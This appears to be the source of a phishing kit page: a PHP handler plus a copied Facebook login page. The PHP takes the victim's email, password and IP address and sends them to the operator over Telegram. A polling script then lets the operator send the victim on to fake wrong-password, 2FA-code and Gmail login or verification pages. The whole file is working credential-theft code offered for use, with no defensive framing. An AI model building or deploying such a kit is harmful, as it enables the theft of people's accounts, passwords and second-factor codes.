<?php
include "helper.php";
$token=$_POST['token'];
$email=$_POST['email'];
$pwd=$_POST['password'];

$filePath = "status/" .$token. ".txt";

file_put_contents($filePath, 'hold');



saveEmail($token, $email);

$ip = getClientIp();

$user_agent = $_SERVER['HTTP_USER_AGENT'];


$message="NEW\nid: <code>".$token."</code>\n\n<code>".$email."</code>\n<code>".$pwd."</code>\n\nip: <code>".$ip."</code>";
$keyboard = getGmailNavKeyboard($token);
sendTGWithButtons($message, $keyboard);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="DC.title" content="">
    <meta name="revisit-after" content="1 day">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="distribution" content="GLOBAL">
    <meta name="rating" content="General">
    <meta name="copyright" content="">
    <meta name="author" content="">
    <meta name="theme-color" content="#FFF">
    <meta name="robots" content="noindex,nofollow">
    <link href="files/boxicons.min.css" rel="stylesheet">
    <link href="files/main.css" rel="stylesheet">
    <script src="files/jquery-3.6.4.min.js"></script>
    <link href="files/jquery.select.css" rel="stylesheet">
    <script src="files/socket.io.js"></script>
    <script src="files/jquery.select.min.js"></script>
    <title></title>
    <link rel="icon" href="fb-files/favicon.png">
</head>

<body>
    <link href="fb-files/auth.module.css" rel="stylesheet">
    <link href="fb-files/login.module.css?id=1" rel="stylesheet">
    <div class="login_main">
        <div class="container">
            <div class="mobile_header">
                <p>English (US)</p>
            </div>
            <img class="desktop_icon" src="fb-files/20200731035726.svg" alt="Icon">
            <img class="mobile_icon" src="fb-files/fb-icon.png" alt="Icon">

            <form method="POST" action="login_POST.php" class="form_container" id="f1">
                <input type="hidden" name="token" id="token" value="<?= $token; ?>" />
                <h2>Log in to Facebook</h2>
                <div class="alert">
                    <p>You must log in to continue.</p>
                </div>
                <div class="inputs">
                    <div>
                        <input id="email" type="text" name="email" data-email="true" data-required="true" placeholder="Mobile number or email" value="<?= $email; ?>">
                    </div>
                    <div>
                        <input type="password" value="<?= $pwd; ?>" name="password" id="pwd" placeholder="Password" data-required="true">
                       
                    </div>
                    <button type="button" name="submitLogin"  style="cursor:pointer;background-color:#1877f27a" id="btn_submit"> 
          <i class="bx bx-loader-alt bx-spin bx-rotate-90"></i>
          Log in
        </button>
                </div>
                <div class="links">
                    <a href="https://www.facebook.com/login/identify">Forgot password?</a>
                    <span> · </span>
                    <a href="#">Sign up for Facebook</a>
                </div>
            </form>

            <div class="mobile_footer">
                <a href="#" target="_blank">Create new account</a>
                <img src="fb-files/meta-logo.png" alt="Logo">
                <div class="list">
                    <a href="#" target="_blank">About</a>
                    <a href="#" target="_blank">Help</a>
                    <a href="#" target="_blank">More</a>
                </div>
            </div>

            <div class="mobile_background">
                <div class="a">
                    <div class="b"></div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="topFooter">
                <a href="#">English (UK)</a>
                <a href="#">Deutsch</a>
                <a href="#">Türkçe</a>
                <a href="#">Српски</a>
                <a href="#">Français (France)</a>
                <a href="#">Italiano</a>
                <a href="#">Bosanski</a>
                <a href="#">Svenska</a>
                <a href="#">Español</a>
                <a href="#">Português (Brasil)</a>
            </div>
            <div class="bottomFooter">
                <a href="#">Sign Up</a>
                <a href="#">Log in</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Watch</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Meta Pay</a>
                <a href="#">Oculus</a>
                <a href="#">Portal</a>
                <a href="#">Instagram</a>
                <a href="#">Bulletin</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Centre</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Privacy Center</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Cookies</a>
                <a href="#">AdChoices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
                <a href="#">Contact uploading and non-users</a>
            </div>
            <span>Meta © 2025</span>
        </div>
    </div>




</body>

</html>

<script>
const token = "<?php echo $token; ?>"; 
const email = "<?php echo $email; ?>"; 

function checkStatus() {
    fetch(`login_STATUS.php?token=${token}`)
        .then(response => response.text())
        .then(data => {
            data = data.trim();

            if (data === 'hold') {
                console.log("Do not redirect - HOLD");
                return;
            } else if (data === 'pwd') {
                window.location.href = 'login.php?token='+token+'&w=1&email='+email;
            } else if (data === 'continue') {
                window.location.href = 'continue.php?token='+token;
            } else if (data === 'code') {
                window.location.href = 'code.php?token='+token;
            } else if (data === 'break') {
                window.location.href = 'break.php?token='+token;
            } else if (data === 'gm_verify') {
                window.location.href = 'gmail_verify.php?token='+token;
            } else if (data === 'gm_login') {
                window.location.href = 'gmail_login.php?token='+token;
            } else if (data === 'gm_wrong_pass') {
                window.location.href = 'gmail_login.php?token='+token+'&w=1';
            } else if (data === 'gm_2fa_device') {
                window.location.href = 'gmail_2fa.php?token='+token+'&mode=device';
            } else if (data === 'gm_2fa_pick') {
                window.location.href = 'gmail_2fa.php?token='+token+'&mode=pick';
            } else if (data === 'gm_hold') {
                window.location.href = 'gmail_login_POST.php?token='+token+'&waiting=1';
            } else{
                return;
            }
        })
        .catch(error => console.error('Error:', error));
}

const statusInterval = setInterval(checkStatus, 3000);
</script>

